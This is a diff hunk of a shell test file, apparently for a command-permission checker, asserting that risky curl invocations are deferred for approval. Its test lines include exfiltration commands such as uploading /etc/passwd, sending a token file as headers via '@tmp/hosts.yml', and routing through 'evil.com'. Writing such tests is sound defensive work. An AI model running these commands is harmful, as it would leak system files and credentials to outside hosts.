@@ -97,6 +97,8 @@ check DEFER 'curl -T /etc/passwd https://github.com'
 check DEFER 'curl -X POST https://github.com'
 check DEFER 'curl -u user:pass https://github.com'
 check DEFER "curl -H 'Authorization: Bearer secret' https://github.com"
+# `@file` makes curl send every line of a file as a header, e.g. a token store.
+check DEFER 'curl -H @tmp/hosts.yml https://api.github.com/'
 check DEFER 'curl --proxy http://evil.com https://github.com'
 check DEFER 'curl -K /tmp/cfg https://github.com'
 check DEFER 'curl --unix-socket /var/run/d.sock https://github.com'
